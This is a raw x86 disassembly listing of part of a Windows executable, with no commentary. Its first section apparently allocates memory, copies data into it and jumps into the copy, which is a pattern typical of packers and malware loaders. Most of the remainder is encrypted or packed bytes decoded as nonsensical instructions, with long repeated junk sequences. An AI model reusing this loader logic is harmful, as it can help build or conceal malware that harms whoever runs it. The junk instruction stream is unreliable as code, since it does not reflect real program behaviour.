  4153b1:	push   edx
  4153b2:	call   DWORD PTR ds:0x417038
  4153b8:	mov    DWORD PTR [ebp-0x44],eax
  4153bb:	push   DWORD PTR [ebp-0x30]
  4153be:	push   0x1000
  4153c3:	mov    eax,DWORD PTR [ebp-0x14]
  4153c6:	add    eax,0x23
  4153c9:	add    eax,0x23
  4153cc:	push   eax
  4153cd:	xor    eax,eax
  4153cf:	push   eax
  4153d0:	mov    ecx,DWORD PTR [ebp-0x44]
  4153d3:	call   ecx
  4153d5:	push   eax
  4153d6:	pop    ecx
  4153d7:	mov    DWORD PTR [ebp-0x4],ecx
  4153da:	mov    eax,DWORD PTR [ebp-0x68]
  4153dd:	sub    eax,0xdae0b
  4153e2:	mov    DWORD PTR [ebp-0x68],eax
  4153e5:	cmp    DWORD PTR [ebp-0x4],0x0
  4153e9:	jne    0x415403
  4153eb:	push   0x0
  4153ed:	push   0x0
  4153ef:	call   0x416aac
  4153f4:	push   0x0
  4153f6:	call   DWORD PTR ds:0x417040
  4153fc:	mov    BYTE PTR ds:0x42fed0,0x0
  415403:	mov    ecx,DWORD PTR [ebp-0x4]
  415406:	add    ecx,DWORD PTR [ebp-0x14]
  415409:	mov    edx,DWORD PTR [ebp-0x8]
  41540c:	mov    DWORD PTR [ecx],edx
  41540e:	mov    eax,DWORD PTR [ebp-0x4]
  415411:	add    eax,DWORD PTR [ebp-0x54]
  415414:	mov    DWORD PTR [ebp-0x5c],eax
  415417:	mov    ecx,DWORD PTR ds:0x417038
  41541d:	mov    DWORD PTR [ebp-0x4c],ecx
  415420:	mov    edx,DWORD PTR [ebp-0x4]
  415423:	add    edx,DWORD PTR [ebp-0x14]
  415426:	mov    eax,DWORD PTR [ebp+0x8]
  415429:	mov    DWORD PTR [edx+0x4],eax
  41542c:	mov    ecx,DWORD PTR [ebp-0x4]
  41542f:	add    ecx,DWORD PTR [ebp-0x14]
  415432:	mov    DWORD PTR [ebp-0xc],ecx
  415435:	cmp    DWORD PTR [ebp-0x68],0x0
  415439:	jbe    0x415456
  41543b:	mov    edx,DWORD PTR [ebp-0xc]
  41543e:	push   edx
  41543f:	mov    eax,DWORD PTR [ebp-0x14]
  415442:	push   eax
  415443:	mov    ecx,DWORD PTR [ebp-0x2c]
  415446:	add    ecx,DWORD PTR [ebp-0x68]
  415449:	push   ecx
  41544a:	mov    edx,DWORD PTR [ebp-0x4]
  41544d:	push   edx
  41544e:	call   0x4169bf
  415453:	add    esp,0x10
  415456:	cmp    DWORD PTR [ebp-0x5c],0x0
  41545a:	je     0x41546a
  41545c:	push   DWORD PTR [ebp-0x4c]
  41545f:	push   DWORD PTR [ebp-0x6c]
  415462:	mov    edx,DWORD PTR [ebp-0x5c]
  415465:	push   eax
  415466:	jmp    edx
  415468:	jmp    0x415470
  41546a:	mov    eax,DWORD PTR [ebp+0x8]
  41546d:	mov    DWORD PTR [ebp-0x18],eax
  415470:	mov    eax,0x1
  415475:	mov    esp,ebp
  415477:	pop    ebp
  415478:	ret    
  415479:	push   ebp
  41547a:	mov    ebp,esp
  41547c:	pop    ebp
  41547d:	ret    
  41547e:	push   ebp
  41547f:	mov    ebp,esp
  415481:	sub    esp,0x54
  415484:	mov    DWORD PTR [ebp-0x34],0x0
  41548b:	mov    DWORD PTR [ebp-0x4],0x0
  415492:	mov    DWORD PTR [ebp-0x50],0x0
  415499:	mov    DWORD PTR [ebp-0x4c],0x0
  4154a0:	mov    DWORD PTR [ebp-0x30],0x0
  4154a7:	lea    eax,[ebp-0x48]
  4154aa:	push   eax
  4154ab:	call   DWORD PTR ds:0x417028
  4154b1:	mov    ecx,DWORD PTR [ebp-0x34]
  4154b4:	push   ecx
  4154b5:	call   0x4154e4
  4154ba:	add    esp,0x4
  4154bd:	call   0x4169b0
  4154c2:	mov    DWORD PTR [ebp-0x54],0x0
  4154c9:	jmp    0x4154d4
  4154cb:	mov    edx,DWORD PTR [ebp-0x54]
  4154ce:	add    edx,0x1
  4154d1:	mov    DWORD PTR [ebp-0x54],edx
  4154d4:	cmp    DWORD PTR [ebp-0x54],0x64
  4154d8:	jae    0x4154dc
  4154da:	jmp    0x4154cb
  4154dc:	xor    eax,eax
  4154de:	mov    esp,ebp
  4154e0:	pop    ebp
  4154e1:	ret    0x10
  4154e4:	push   ebp
  4154e5:	mov    ebp,esp
  4154e7:	sub    esp,0x3c
  4154ea:	push   esi
  4154eb:	mov    DWORD PTR [ebp-0x3c],0x0
  4154f2:	mov    DWORD PTR [ebp-0x38],0x0
  4154f9:	mov    DWORD PTR [ebp-0x30],0x0
  415500:	mov    DWORD PTR [ebp-0x24],0x0
  415507:	mov    DWORD PTR [ebp-0x1c],0x0
  41550e:	mov    DWORD PTR [ebp-0x28],0x0
  415515:	mov    DWORD PTR [ebp-0x2c],0x449408
  41551c:	mov    DWORD PTR [ebp-0x24],0xfaed13c5
  415523:	mov    DWORD PTR [ebp-0x34],0x0
  41552a:	mov    eax,DWORD PTR [ebp-0x24]
  41552d:	mov    DWORD PTR [ebp-0x20],eax
  415530:	mov    DWORD PTR [ebp-0x4],0x0
  415537:	mov    ecx,DWORD PTR ds:0x41702c
  41553d:	mov    DWORD PTR [ebp-0x4],ecx
  415540:	push   0x0
  415542:	push   0x4e
  415544:	push   0x1e
  415546:	push   0x0
  415548:	push   0xffffffff
  41554a:	call   DWORD PTR ds:0x417034
  415550:	test   eax,eax
  415552:	je     0x41698f
  415558:	scas   eax,DWORD PTR es:[edi]
  415559:	mov    cl,0xeb
  41555b:	lock pop esi
  41555d:	int3   
  41555e:	fnsave [ebx+0x104e849f]
  415564:	call   0xcc5d:0x487beb1d
  41556b:	fnsave [ebx+0x504e849b]
  415571:	gs loop 0x41555f
  415574:	jnp    0x415566
  415576:	pop    ebp
  415577:	int3   
  415578:	fnsave [ebx+0x104e849b]
  41557e:	gs loop 0x41556c
  415581:	jnp    0x415573
  415583:	pop    ebp
  415584:	int3   
  415585:	fnsave [ebx+0x104e849b]
  41558b:	gs loop 0x415579
  41558e:	jnp    0x415580
  415590:	pop    ebp
  415591:	int3   
  415592:	fnsave [ebx+0x104e8593]
  415598:	imul   edi,ebp,0x51
  41559b:	jne    0x41558d
  41559d:	jmp    0x23d36667
  4155a2:	test   DWORD PTR [edx],eax
  4155a4:	fld    QWORD PTR [esi+esi*4-0x7d]
  4155a8:	adc    al,BYTE PTR [ebx-0x23504383]
  4155ae:	cld    
  4155af:	imul   BYTE PTR [edi]
  4155b1:	jge    0x4155f8
  4155b3:	or     DWORD PTR [edx-0x47cd61eb],0xa4fed1fd
  4155bd:	cmp    al,0x65
  4155bf:	or     eax,edx
  4155c1:	adc    BYTE PTR ds:0x8e8319d0,0x93
  4155c8:	imul   bl
  4155ca:	sub    dh,BYTE PTR [ebp+0x4b]
  4155cd:	out    dx,eax
  4155ce:	out    0x71,al
  4155d0:	aam    0x5d
  4155d2:	int3   
  4155d3:	fnsave [ebx+0x6a4e849b]
  4155d9:	stos   BYTE PTR es:[edi],al
  4155da:	hlt    
  4155db:	gs inc ebp
  4155dd:	pop    esi
  4155de:	and    eax,0xe31de311
  4155e3:	pop    ecx
  4155e4:	jo     0x4155a4
  4155e6:	sbb    eax,0x1648ce3f
  4155eb:	sub    dh,0x73
  4155ee:	retf   
  4155ef:	inc    esi
  4155f0:	mov    eax,ds:0x5db8c27d
  4155f5:	inc    ebp
  4155f6:	add    ebp,DWORD PTR ds:0x6e0eff78
  4155fc:	mov    gs,WORD PTR [edx]
  4155fe:	ss int 0x34
  415601:	cmp    bh,BYTE PTR [eax]
  415603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415604:	retf   
  415605:	repz mov ah,0x0
  415608:	test   BYTE PTR [ebp+0x7f],cl
  41560b:	xchg   ebx,eax
  41560c:	daa    
  41560d:	retf   
  41560e:	call   0xf811:0xb6264c36
  415615:	sbb    eax,0xbe7059e3
  41561a:	sbb    al,0x3f
  41561c:	mov    ds:0xe8088d4,al
  415621:	push   ebx
  415622:	fld    DWORD PTR [esi-0x4c]
  415625:	loopne 0x41568f
  415627:	mov    eax,0x2dacd8c7
  41562c:	and    al,0x62
  41562e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41562f:	outs   dx,BYTE PTR ds:[esi]
  415630:	mov    esi,0x5acdacb7
  415635:	dec    esp
  415636:	xchg   ebx,eax
  415637:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415638:	aad    0x6e
  41563a:	sub    DWORD PTR [eax],eax
  41563c:	mov    WORD PTR ds:0xc4293fc,?
  415642:	add    DWORD PTR [ebx+0x11255e45],0x849bb3dd
  41564c:	dec    esi
  41564d:	adc    BYTE PTR [ebp-0x1e],ah
  415650:	jmp    0x4156cd
  415652:	lock pop ebp
  415654:	int3   
  415655:	fnsave [ebx+0x104e849b]
  41565b:	gs loop 0x415649
  41565e:	jnp    0x415650
  415660:	or     eax,0xd7b3dd89
  415665:	test   DWORD PTR [ebp+0x10],ecx
  415668:	add    ebp,DWORD PTR [esi+eiz*4-0x33a20fcc]
  41566f:	fnsave [ebx-0xfb17b65]
  415675:	gs loopne 0x415662
  415678:	jo     0x41566b
  41567a:	push   edi
  41567b:	int3   
  41567c:	fst    QWORD PTR [ecx-0x61]
  41567f:	test   BYTE PTR [esi-0x6c],cl
  415682:	arpl   dx,sp
  415684:	jmp    0x415701
  415686:	lock pop ebp
  415688:	(bad)  
  415689:	pusha  
  41568a:	mov    bl,0x9b
  41568c:	test   BYTE PTR [esi+0x10],bl
  41568f:	gs loop 0x41567d
  415692:	jle    0x415684
  415694:	pop    ebp
  415695:	int3   
  415696:	popf   
  415697:	mov    bl,0x9b
  415699:	xchg   esp,eax
  41569a:	dec    esi
  41569b:	adc    BYTE PTR [ebp-0x20],ah
  41569e:	jmp    0x41571b
  4156a0:	cmc    
  4156a1:	pop    ebp
  4156a2:	int    0xdd
  4156a4:	mov    bl,0x9b
  4156a6:	test   BYTE PTR [esi+0x15],cl
  4156a9:	gs jecxz 0x415697
  4156ac:	jnp    0x41569e
  4156ae:	pop    ebp
  4156af:	int3   
  4156b0:	fld    QWORD PTR [ebx+0x144e8497]
  4156b6:	gs loop 0x41569a
  4156b9:	test   esp,esi
  4156bb:	pop    ebp
  4156bc:	into   
  4156bd:	(bad)  
  4156bf:	sbb    al,BYTE PTR [esi+ecx*2-0x41d9b00]
  4156c6:	jnp    0x4156b8
  4156c8:	pop    ebp
  4156c9:	int3   
  4156ca:	int    0xb3
  4156cc:	fwait
  4156cd:	xchg   esp,eax
  4156ce:	dec    esi
  4156cf:	adc    BYTE PTR [ebp-0x1e],ah
  4156d2:	jmp    0x41574f
  4156d4:	loopne 0x415733
  4156d6:	int3   
  4156d7:	fnsave [ebx+0x104e849b]
  4156dd:	gs loop 0x4156cb
  4156e0:	jg     0x4156d2
  4156e2:	push   ecx
  4156e3:	int3   
  4156e4:	test   BYTE PTR [eax-0x2fb17b65],dh
  4156ea:	outs   dx,BYTE PTR ds:[esi]
  4156eb:	loop   0x4156ab
  4156ed:	inc    esp
  4156ee:	lock pop ebp
  4156f0:	int3   
  4156f1:	fnsave [ebx+0x104e849b]
  4156f7:	gs loop 0x4156e5
  4156fa:	jnp    0x4156ec
  4156fc:	pop    ebp
  4156fd:	int3   
  4156fe:	fnsave [ebx+0x1042a49b]
  415704:	jge    0x4156e8
  415706:	jmp    0x415783
  415708:	lock pop ebp
  41570a:	int3   
  41570b:	fnsave [ebx+0x104e849b]
  415711:	gs loop 0x4156ff
  415714:	jnp    0x415706
  415716:	pop    ebp
  415717:	int3   
  415718:	fnsave [ebx+0x104e849b]
  41571e:	gs loop 0x41570c
  415721:	jnp    0x415713
  415723:	pop    ebp
  415724:	int3   
  415725:	fnsave [ebx+0x104e849b]
  41572b:	gs loop 0x415719
  41572e:	jnp    0x415720
  415730:	pop    ebp
  415731:	int3   
  415732:	fnsave [ebx+0x104e849b]
  415738:	gs loop 0x415726
  41573b:	jnp    0x41572d
  41573d:	pop    ebp
  41573e:	int3   
  41573f:	fnsave [ebx+0x104e849b]
  415745:	gs loop 0x415733
  415748:	jnp    0x41573a
  41574a:	pop    ebp
  41574b:	int3   
  41574c:	fnsave [ebx+0x104e849b]
  415752:	gs loop 0x415740
  415755:	jnp    0x415747
  415757:	pop    ebp
  415758:	loop   0x415703
  41575a:	(bad)  
  41575b:	jecxz  0x41574d
  41575d:	dec    esi
  41575e:	adc    BYTE PTR [ebp-0x1e],ah
  415761:	pop    ebx
  415762:	jo     0x415754
  415764:	pop    ebp
  415765:	(bad)  
  415767:	mov    bl,0x9b
  415769:	loop   0x4157b5
  41576b:	adc    BYTE PTR [ebp-0x1a],ah
  41576e:	jmp    0x4157eb
  415770:	mov    al,ds:0xe7ef8f18
  415775:	aam    0x84
  415777:	dec    esi
  415778:	adc    BYTE PTR [ebp-0x1e],ah
  41577b:	jmp    0x4157d8
  41577d:	lock pop ebp
  41577f:	sub    al,0xf3
  415781:	shr    eax,0xf6
  415784:	sub    eax,0xebe26510
  415789:	sbb    esi,eax
  41578b:	pop    ebp
  41578c:	int3   
  41578d:	sbb    eax,0x1c849bb8
  415792:	adc    BYTE PTR [ebp-0x1e],ah
  415795:	cmp    DWORD PTR [edi-0x10],0xb3ddcc5d
  41579c:	fwait
  41579d:	test   BYTE PTR [esi+0x10],cl
  4157a0:	gs loop 0x41578e
  4157a3:	jnp    0x415775
  4157a5:	pop    ebp
  4157a6:	int3   
  4157a7:	cmp    eax,0x22e1e99d
  4157ac:	jg     0x4157b4
  4157ae:	loop   0x41579b
  4157b0:	jnp    0x4157a4
  4157b2:	pop    ebp
  4157b3:	int3   
  4157b4:	fst    QWORD PTR [ebx+0x124e8497]
  4157ba:	gs loop 0x4157a8
  4157bd:	(bad)  
  4157be:	hlt    
  4157bf:	pop    ebp
  4157c0:	int3   
  4157c1:	fnsave [ebx+0x104e849b]
  4157c7:	gs loop 0x4157b5
  4157ca:	jnp    0x4157bc
  4157cc:	sbb    eax,0x9b73ddcc
  4157d1:	test   BYTE PTR [esi+0x10],cl
  4157d4:	gs loop 0x4157c2
  4157d7:	jnp    0x4157c9
  4157d9:	pop    ebp
  4157da:	int3   
  4157db:	fnsave [ebx+0x104e849b]
  4157e1:	gs loop 0x4157cf
  4157e4:	jnp    0x4157d6
  4157e6:	pop    ebp
  4157e7:	int3   
  4157e8:	fnsave [ebx+0x104e849b]
  4157ee:	gs loop 0x4157dc
  4157f1:	jnp    0x4157e3
  4157f3:	pop    ebp
  4157f4:	int3   
  4157f5:	fnsave [ebx+0x104e849b]
  4157fb:	gs loop 0x4157e9
  4157fe:	jnp    0x4157f0
  415800:	pop    ebp
  415801:	int3   
  415802:	fnsave [ebx+0x104e849b]
  415808:	gs loop 0x4157f6
  41580b:	jnp    0x4157fd
  41580d:	pop    ebp
  41580e:	int3   
  41580f:	fnsave [ebx+0x104e849b]
  415815:	gs loop 0x415803
  415818:	jnp    0x41580a
  41581a:	pop    ebp
  41581b:	int3   
  41581c:	fnsave [ebx+0x104e849b]
  415822:	gs loop 0x415810
  415825:	jnp    0x415817
  415827:	pop    ebp
  415828:	int3   
  415829:	fnsave [ebx+0x104e849b]
  41582f:	gs loop 0x41581d
  415832:	jnp    0x415824
  415834:	pop    ebp
  415835:	int3   
  415836:	fnsave [ebx+0x104e849b]
  41583c:	gs loop 0x41582a
  41583f:	jnp    0x415831
  415841:	pop    ebp
  415842:	int3   
  415843:	fnsave [ebx+0x104e849b]
  415849:	gs loop 0x415837
  41584c:	jnp    0x41583e
  41584e:	pop    ebp
  41584f:	int3   
  415850:	fnsave [ebx+0x104e849b]
  415856:	gs loop 0x415844
  415859:	jnp    0x41584b
  41585b:	pop    ebp
  41585c:	int3   
  41585d:	fnsave [ebx+0x104e849b]
  415863:	gs loop 0x415851
  415866:	jnp    0x415858
  415868:	pop    ebp
  415869:	int3   
  41586a:	fnsave [ebx+0x104e849b]
  415870:	gs loop 0x41585e
  415873:	jnp    0x415865
  415875:	pop    ebp
  415876:	int3   
  415877:	fnsave [ebx+0x104e849b]
  41587d:	gs loop 0x41586b
  415880:	jnp    0x415872
  415882:	pop    ebp
  415883:	int3   
  415884:	fnsave [ebx+0x104e849b]
  41588a:	gs loop 0x415878
  41588d:	jnp    0x41587f
  41588f:	pop    ebp
  415890:	int3   
  415891:	fnsave [ebx+0x104e849b]
  415897:	gs loop 0x415885
  41589a:	jnp    0x41588c
  41589c:	pop    ebp
  41589d:	int3   
  41589e:	fnsave [ebx+0x104e849b]
  4158a4:	gs loop 0x415892
  4158a7:	jnp    0x415899
  4158a9:	pop    ebp
  4158aa:	int3   
  4158ab:	fnsave [ebx+0x104e849b]
  4158b1:	gs loop 0x41589f
  4158b4:	jnp    0x4158a6
  4158b6:	pop    ebp
  4158b7:	int3   
  4158b8:	fnsave [ebx+0x104e849b]
  4158be:	gs loop 0x4158ac
  4158c1:	jnp    0x4158b3
  4158c3:	pop    ebp
  4158c4:	int3   
  4158c5:	fnsave [ebx+0x104e849b]
  4158cb:	gs loop 0x4158b9
  4158ce:	jnp    0x4158c0
  4158d0:	pop    ebp
  4158d1:	int3   
  4158d2:	fnsave [ebx+0x104e849b]
  4158d8:	gs loop 0x4158c6
  4158db:	jnp    0x4158cd
  4158dd:	pop    ebp
  4158de:	int3   
  4158df:	fnsave [ebx+0x104e849b]
  4158e5:	gs loop 0x4158d3
  4158e8:	jnp    0x4158da
  4158ea:	pop    ebp
  4158eb:	int3   
  4158ec:	fnsave [ebx+0x104e849b]
  4158f2:	gs loop 0x4158e0
  4158f5:	jnp    0x4158e7
  4158f7:	pop    ebp
  4158f8:	int3   
  4158f9:	fnsave [ebx+0x104e849b]
  4158ff:	gs loop 0x4158ed
  415902:	jnp    0x4158f4
  415904:	pop    ebp
  415905:	int3   
  415906:	fnsave [ebx+0x104e849b]
  41590c:	gs loop 0x4158fa
  41590f:	jnp    0x415901
  415911:	pop    ebp
  415912:	int3   
  415913:	fnsave [ebx+0x104e849b]
  415919:	gs loop 0x415907
  41591c:	jnp    0x41590e
  41591e:	pop    ebp
  41591f:	int3   
  415920:	fnsave [ebx+0x104e849b]
  415926:	gs loop 0x415914
  415929:	jnp    0x41591b
  41592b:	pop    ebp
  41592c:	int3   
  41592d:	fnsave [ebx+0x104e849b]
  415933:	gs loop 0x415921
  415936:	jnp    0x415928
  415938:	pop    ebp
  415939:	int3   
  41593a:	fnsave [ebx+0x104e849b]
  415940:	gs loop 0x41592e
  415943:	jnp    0x415935
  415945:	pop    ebp
  415946:	int3   
  415947:	fnsave [ebx+0x104e849b]
  41594d:	gs loop 0x41593b
  415950:	jnp    0x415942
  415952:	pop    ebp
  415953:	int3   
  415954:	fnsave [ebx+0x5ee5849b]
  41595a:	outs   dx,BYTE PTR ds:[esi]
  41595b:	loop   0x415921
  41595d:	jnp    0x41594f
  41595f:	dec    ebp
  415960:	int3   
  415961:	fstp   QWORD PTR [ecx-0x52c5a1c7]
  415967:	sub    dl,cl
  415969:	stc    
  41596a:	push   eax
  41596b:	retf   
  41596c:	pusha  
  41596d:	and    ebp,DWORD PTR [eax+0x21]
  415970:	popf   
  415971:	int    0x17
  415973:	loope  0x41592e
  415975:	push   ecx
  415976:	clc    
  415977:	cmp    al,0xcb
  415979:	mov    ah,0x14
  41597b:	push   esi
  41597c:	icebp  
  41597d:	jmp    0x34bc:0xf25fb446
  415984:	scas   eax,DWORD PTR es:[edi]
  415985:	mov    al,0x3e
  415987:	mov    eax,ds:0xa14a083e
  41598c:	or     eax,0xfc62ed19
  415991:	xchg   al,dl
  415993:	fs hlt 
  415995:	sahf   
  415996:	mov    cl,0xd7
  415998:	ret    
  415999:	xchg   esi,eax
  41599a:	mov    WORD PTR [edx+0x6c8d5ad],?
  4159a0:	test   eax,0x6afdcad5
  4159a5:	(bad)  
  4159a6:	and    DWORD PTR [edx+eax*4+0x5a8b74f2],ecx
  4159ad:	addr16 popa 
  4159af:	pop    eax
  4159b0:	clc    
  4159b1:	addr16 mov eax,cs:0x44f6
  4159b6:	jne    0x4159ef
  4159b8:	call   0xdbb7:0xe89e7a6b
  4159bf:	jno    0x415a29
  4159c1:	je     0x41599b
  4159c3:	or     eax,0xeaa54396
  4159c8:	cmp    BYTE PTR [ecx+0x5b9c83e2],ah
  4159ce:	jne    0x415997
  4159d0:	push   0xb96258cf
  4159d5:	push   edi
  4159d6:	mov    edi,0xd96782c8
  4159db:	xor    al,0x30
  4159dd:	jb     0x415a1f
  4159df:	mov    DWORD PTR [ebp+0x2f],ebp
  4159e2:	stos   BYTE PTR es:[edi],al
  4159e3:	sti    
  4159e4:	in     eax,0x5
  4159e6:	add    bl,bl
  4159e8:	push   edi
  4159e9:	in     al,dx
  4159ea:	sbb    ebx,edi
  4159ec:	inc    esp
  4159ed:	rol    bh,1
  4159ef:	mov    edx,0x5368a0f1
  4159f4:	jnp    0x415a34
  4159f6:	jg     0x41599c
  4159f8:	leave  
  4159f9:	sub    BYTE PTR [eax+0x40120597],0x31
  415a00:	dec    edx
  415a01:	mov    ds:0x9fbe51c5,al
  415a06:	mov    edx,0xf60860ed
  415a0b:	sbb    dh,bl
  415a0d:	xor    BYTE PTR [esi+0x3c27ed9d],ah
  415a13:	pop    eax
  415a14:	pushf  
  415a15:	ins    DWORD PTR es:[edi],dx
  415a16:	imul   esi,DWORD PTR [ebp-0x16],0x38
  415a1a:	arpl   bp,bx
  415a1c:	std    
  415a1d:	aad    0xbd
  415a1f:	clc    
  415a20:	lock fild DWORD PTR [eax+0x52c40464]
  415a27:	aam    0xf4
  415a29:	and    DWORD PTR [edx+ebp*1-0x78],0xa75074db
  415a31:	das    
  415a32:	mov    dh,0xb9
  415a34:	jmp    0x4159f0
  415a36:	mov    cl,BYTE PTR [esi-0x4e5d772b]
  415a3c:	mov    ah,0x44
  415a3e:	xor    eax,0xce9b377f
  415a43:	sahf   
  415a44:	std    
  415a45:	add    al,0xc3
  415a47:	std    
  415a48:	sub    al,0x60
  415a4a:	mov    ch,BYTE PTR [ebp+edi*2-0x43dadcdf]
  415a51:	scas   eax,DWORD PTR es:[edi]
  415a52:	add    al,0xc6
  415a54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a55:	ror    BYTE PTR [ecx+0x751f19e9],0x1e
  415a5c:	mov    al,0xff
  415a5e:	push   eax
  415a5f:	dec    ebp
  415a60:	clc    
  415a61:	jp     0x415a7d
  415a63:	pop    edi
  415a64:	or     al,0x78
  415a66:	or     eax,0x10ee6159
  415a6b:	scas   eax,DWORD PTR es:[edi]
  415a6c:	enter  0x6827,0xce
  415a70:	sub    al,BYTE PTR [ebp-0x4c29e7f9]
  415a76:	and    ebp,DWORD PTR [edi-0x11cace25]
  415a7c:	and    eax,0x3a24cd3d
  415a81:	pop    edx
  415a82:	inc    esp
  415a83:	(bad)  
  415a84:	jns    0x415a46
  415a86:	scas   al,BYTE PTR es:[edi]
  415a87:	(bad)  
  415a88:	mov    eax,ds:0x8bc480b7
  415a8d:	inc    ebp
  415a8e:	stc    
  415a8f:	cmp    BYTE PTR ds:0x8a6f5cc,0x89
  415a96:	add    DWORD PTR [ecx+0x277eab98],esi
  415a9c:	xor    eax,0xf475679e
  415aa1:	data16 test al,0x48
  415aa4:	mov    ebp,0xdff840f8
  415aa9:	inc    esi
  415aaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415aab:	mov    esi,0x98099712
  415ab0:	test   al,0x9b
  415ab2:	adc    al,BYTE PTR [ebp+0x700a169c]
  415ab8:	gs enter 0x733a,0xe1
  415abd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415abe:	sbb    DWORD PTR [edx],ebp
  415ac0:	xor    edi,eax
  415ac2:	adc    al,0xa
  415ac4:	imul   edi,DWORD PTR [eax+0x2c],0xbff03b79
  415acb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415acc:	jp     0x415a73
  415ace:	mov    fs,WORD PTR [esi+ebx*8+0xa02b09e]
  415ad5:	add    eax,0x225b8d29
  415ada:	mov    edi,es
  415adc:	jns    0x415b32
  415ade:	aad    0xcd
  415ae0:	jno    0x415b61
  415ae2:	push   es
  415ae3:	mov    DWORD PTR [esi+0x12],ebx
  415ae6:	xor    DWORD PTR [ebx+0x7ed4687e],ebp
  415aec:	leave  
  415aed:	sub    DWORD PTR [ecx],0xa26997c4
  415af3:	sub    ah,BYTE PTR [esi+0xc872367]
  415af9:	ficomp DWORD PTR [ebx]
  415afb:	xor    esp,DWORD PTR [edx+0x5e9a74b8]
  415b01:	adc    BYTE PTR [edi+ebx*1],dh
  415b04:	popf   
  415b05:	adc    dh,BYTE PTR [edi+ecx*8-0x7a]
  415b09:	sbb    dl,bl
  415b0b:	inc    edx
  415b0c:	sahf   
  415b0d:	mov    dl,0x5e
  415b0f:	dec    ebp
  415b10:	jno    0x415b18
  415b12:	adc    ebp,esi
  415b14:	ret    
  415b15:	loopne 0x415b66
  415b17:	and    eax,DWORD PTR [ebp+0x5908cc7d]
  415b1d:	int3   
  415b1e:	jecxz  0x415b75
  415b20:	push   cs
  415b21:	adc    edx,DWORD PTR [esi-0x4c]
  415b24:	add    DWORD PTR [ebp+0xff412f1],ebp
  415b2a:	dec    esp
  415b2b:	test   DWORD PTR [edi-0x3a],esi
  415b2e:	mov    esp,DWORD PTR [edx-0x761beb10]
  415b34:	xor    dh,cl
  415b36:	in     eax,0x65
  415b38:	mov    bl,0x40
  415b3a:	sbb    bl,bh
  415b3c:	js     0x415ad1
  415b3e:	pop    edi
  415b3f:	jo     0x415ba0
  415b41:	rcl    BYTE PTR [ebx],cl
  415b43:	gs pop ds
  415b45:	xchg   ecx,eax
  415b46:	fwait
  415b47:	dec    ebx
  415b48:	iret   
  415b49:	aad    0xf9
  415b4b:	mov    ah,0xf7
  415b4d:	daa    
  415b4e:	fnsave es:[esi-0x49]
  415b52:	fldln2 
  415b54:	push   cs
  415b55:	inc    edx
  415b56:	mov    cl,0x7c
  415b58:	pop    es
  415b59:	and    BYTE PTR [edi-0x4d],ah
  415b5c:	sbb    BYTE PTR [ecx+0x78],al
  415b5f:	aaa    
  415b60:	fcmovnbe st,st(5)
  415b62:	inc    esp
  415b63:	mov    cl,0x1b
  415b65:	mov    eax,ds:0xbd2db07b
  415b6a:	dec    esp
  415b6b:	dec    ebp
  415b6c:	pop    ebx
  415b6d:	dec    ebx
  415b6e:	lods   al,BYTE PTR ds:[esi]
  415b6f:	ss pop edx
  415b71:	xchg   esi,eax
  415b72:	lock xchg edx,eax
  415b74:	addr16 clc 
  415b76:	aam    0x9
  415b78:	push   cs
  415b79:	xor    DWORD PTR [ebp+0x3c3b609a],ebx
  415b7f:	push   ss
  415b80:	jmp    0x415b88
  415b82:	rcl    BYTE PTR es:[edi-0x28],cl
  415b86:	cmp    ebp,DWORD PTR [ebx-0x34]
  415b89:	test   DWORD PTR [ebx+0x28],esi
  415b8c:	mov    bl,0xb0
  415b8e:	sbb    al,0x1f
  415b90:	sbb    eax,0x5d37c7c0
  415b95:	mov    ecx,0x801748df
  415b9a:	ror    ebx,1
  415b9c:	adc    bl,ch
  415b9e:	les    ebx,FWORD PTR [eax]
  415ba0:	mov    al,ds:0xc920f947
  415ba5:	dec    ebp
  415ba6:	enter  0xe668,0x51
  415baa:	cli    
  415bab:	and    al,0x56
  415bad:	jmp    0x415ba5
  415baf:	jecxz  0x415bc7
  415bb1:	pop    es
  415bb2:	add    bh,BYTE PTR ds:0xb93a0f80
  415bb8:	push   0xffffffef
  415bba:	mov    dh,0x8d
  415bbc:	cmp    eax,0xe8c6ac05
  415bc1:	or     eax,0xa66175a1
  415bc6:	das    
  415bc7:	inc    edi
  415bc8:	ror    cl,1
  415bca:	adc    edx,DWORD PTR [esi-0x5f]
  415bcd:	adc    eax,eax
  415bcf:	das    
  415bd0:	adc    BYTE PTR [ebp+0x2d012e02],0xd1
  415bd7:	dec    ecx
  415bd8:	and    BYTE PTR [edx+0x10],bh
  415bdb:	(bad)  
  415bdc:	cmp    BYTE PTR [ebp-0x48],ch
  415bdf:	test   edi,0x6670ea8
  415be5:	fldcw  WORD PTR [ebx+ebx*2+0x2e]
  415be9:	in     eax,0xe
  415beb:	jae    0x415b98
  415bed:	cmp    ebp,eax
  415bef:	call   0x240e:0xc4201efe
  415bf6:	stos   DWORD PTR es:[edi],eax
  415bf7:	les    eax,FWORD PTR [edi-0x41486fba]
  415bfd:	(bad)  
  415bfe:	jbe    0x415c28
  415c00:	inc    esi
  415c01:	jo     0x415bf4
  415c03:	cmp    eax,0xbcb9e566
  415c08:	arpl   WORD PTR [edx+0x1],cx
  415c0b:	out    dx,al
  415c0c:	inc    ecx
  415c0d:	mov    cl,0x2d
  415c0f:	dec    edi
  415c10:	sbb    ebx,DWORD PTR [ebx+edi*8+0x6]
  415c14:	push   edx
  415c15:	sbb    al,0xb6
  415c17:	clc    
  415c18:	or     BYTE PTR [edi-0x49],bh
  415c1b:	pop    ebp
  415c1c:	mov    bl,0x22
  415c1e:	push   ds
  415c1f:	mov    bh,0x61
  415c21:	mov    WORD PTR [ecx],gs
  415c23:	mov    WORD PTR [ecx-0x6b],gs
  415c26:	xor    al,BYTE PTR [eax+0x54]
  415c29:	cli    
  415c2a:	sub    al,0x38
  415c2c:	mov    dl,0x35
  415c2e:	stos   DWORD PTR es:[edi],eax
  415c2f:	lahf   
  415c30:	cmp    DWORD PTR [eax-0x74],ebx
  415c33:	(bad)  
  415c34:	ror    DWORD PTR [ebx-0x76da54f8],cl
  415c3a:	pop    edi
  415c3b:	repz jnp 0x415c6c
  415c3e:	icebp  
  415c3f:	int3   
  415c40:	retf   0xc40a
  415c43:	cmp    cl,ah
